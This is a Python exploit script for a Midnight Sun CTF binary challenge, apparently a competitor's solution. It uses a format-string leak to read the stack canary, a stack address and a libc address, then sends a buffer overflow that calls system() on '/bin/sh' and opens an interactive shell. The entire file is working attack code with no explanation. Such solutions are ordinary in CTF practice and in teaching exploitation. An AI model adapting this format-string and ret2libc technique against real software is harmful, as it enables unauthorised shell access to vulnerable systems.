#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

# context.log_level = 'debug'

#==========

mode    = 'SOCKET'
target  = {'host':'pwn2.midnightsunctf.se', 'port':6666}

libc = ELF('libc-2.27.so')
offset_libc_main    = libc.sep_function['__libc_start_main']

#==========

def attack(conn):
    conn.sendlineafter('name? ', '%279$p %282$p %287$p ')
    conn.recvuntil('Hello ')
    canary          = int(conn.recvuntil(' ', drop=True), 16)
    addr_stack_base = int(conn.recvuntil(' ', drop=True), 16) - 0x10
    addr_libc_main  = int(conn.recvuntil(' ', drop=True), 16) - 0xf1

    info('canary            = 0x{:08x}'.format(canary))

    addr_stack_buf  = addr_stack_base - 0x40c
    info('addr_stack_base   = 0x{:08x}'.format(addr_stack_base))

    libc.address    = addr_libc_main - offset_libc_main
    addr_libc_system    = libc.sep_function['system']
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))

    exploit  = '/bin/sh\x00'
    exploit  = exploit.ljust(0x400)
    exploit += p32(canary)
    exploit += 'b'*8
    exploit += p32(0xdeadbeef)
    exploit += p32(addr_libc_system)
    exploit += p32(0xcafebabe)
    exploit += p32(addr_stack_buf)
    conn.sendlineafter('today? ', exploit)

#==========

if __name__=='__main__':
    conn = communicate(mode, **target)
    attack(conn)
    conn.interactive()
   
#==========
